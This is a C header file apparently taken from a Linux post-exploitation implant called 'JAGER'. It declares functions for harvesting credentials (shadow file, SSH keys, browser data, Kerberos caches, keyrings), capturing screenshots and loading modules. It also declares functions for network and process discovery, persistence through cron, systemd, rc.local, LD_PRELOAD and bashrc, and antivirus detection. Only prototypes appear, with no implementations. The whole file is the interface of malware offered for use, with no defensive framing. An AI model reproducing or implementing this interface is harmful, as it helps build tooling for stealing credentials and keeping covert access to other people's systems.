#ifndef JAGER_LINUX_POSTEX_H
#define JAGER_LINUX_POSTEX_H

#include "config.h"

int cred_shadow(char *output, size_t output_size);
int cred_ssh_keys(char *output, size_t output_size);
int cred_browser_linux(char *output, size_t output_size);
int cred_history(char *output, size_t output_size);
int cred_proc_maps(char *output, size_t output_size);
int cred_kerberos_caches(char *output, size_t output_size);
int cred_dpapi_linux(char *output, size_t output_size);
int cred_keyring(char *output, size_t output_size);
int collect_screenshot_linux(unsigned char **out, size_t *out_size);
int module_load_and_run(const unsigned char *data, size_t data_size,
                        const char *symbol, char *out, size_t out_size);

int disc_interfaces(char *out, size_t cap);
int disc_connections(char *out, size_t cap);
int disc_processes(char *out, size_t cap);
int disc_users(char *out, size_t cap);

int persist_cron(const char *name, const char *command);
int persist_systemd(const char *name, const char *binary_path);
int persist_rc_local(const char *command);
int persist_ld_preload(const char *so_path);
int persist_bashrc(const char *command);

char *auto_enum_run(void);
const char *auto_enum_peek(void);
void auto_enum_release(void);
int auto_enum_detect_av(char *out, int max_out);
int auto_enum_integrity(char *out, int max_out);

#endif
